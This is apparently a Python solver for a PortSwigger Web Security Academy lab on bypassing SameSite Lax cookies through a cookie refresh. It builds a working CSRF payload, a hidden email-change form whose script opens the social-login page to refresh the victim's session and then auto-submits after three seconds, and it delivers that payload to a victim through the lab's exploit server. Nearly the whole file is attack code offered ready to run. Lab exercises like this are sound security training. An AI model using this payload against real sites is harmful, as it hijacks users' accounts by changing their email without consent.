######################################################################################
#
# Lab: SameSite Lax bypass via cookie refresh
#
# Hack Steps: 
#      1. Craft an HTML form for changing the email address with a script that opens
#         a new tab to force the victim to refresh their cookie and submit the form
#         after a few seconds to make sure that the redirection occurred
#      2. Deliver the exploit to the victim
#      3. The victim's email will be changed after they trigger the exploit
#
######################################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0aa2002b03fbefb381ae536100bc00f7.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0a5300bd03c4ef21813752fd018800f4.exploit-server.net"

def main():
    new_email = "hacked@you.com" # You can change this to what you want
    payload = f"""<html>
                    <body>
                    <form action="{LAB_URL}/my-account/change-email" method="POST">
                        <input type="hidden" name="email" value="{new_email}" />
                        <input type="submit" value="Submit request" />
                    </form>
                    <script>
                        window.onclick = () => {{ 
                            window.open("{LAB_URL}/social-login");
                            setTimeout(() => {{
                                document.forms[0].submit();
                            }}, 3000);
                        }}
                    </script>
                    </body>
                </html>"""
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }

    print("❯❯ Delivering the exploit to the victim.. ", end="", flush=True)
    
    post_data(EXPLOIT_SERVER_URL, data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The victim's email will be changed after they trigger the exploit") 
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def post_data(url, data):
    try:    
        return requests.post(url, data)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + url + " through exception")
        exit(1)


if __name__ == "__main__":
    main()